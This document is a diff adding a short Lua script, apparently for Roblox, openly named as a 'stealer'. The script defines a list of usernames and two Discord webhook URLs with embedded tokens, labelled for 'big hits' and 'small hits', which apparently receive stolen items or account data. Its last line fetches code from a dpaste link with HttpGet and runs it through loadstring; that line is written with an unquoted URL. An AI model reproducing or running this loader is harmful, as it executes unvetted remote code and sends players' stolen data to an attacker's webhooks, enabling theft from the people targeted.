@@ -1,0 +1,12 @@
+STEALER_LINK = ' ' -- https://dpaste.com/5GHF2PB9M
+
+Usernames = {
+    'first', -- RIP_10Van
+    'second', -- AS MANY AS U WANT BUT DONT FORGET ,
+    'third',
+}
+
+BigHitsWebhook = "https://discord.com/api/webhooks/1340542081755512874/Sr5h7uujMIklsDmSaspneSjDVPnsp9NeZWpkoNjJ3hvHASXVq_tuBzwCnIzX4ow8u6Zr"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1340542233426006178/XqJWyODuZ5hPmgO57__C9pTstktjRgDQP13JGOv6sGEE3ZhGgd6TrD1YSqtDSXrQw4eJ"
+
+loadstring(game:HttpGet(https://dpaste.com/5GHF2PB9M, true))()
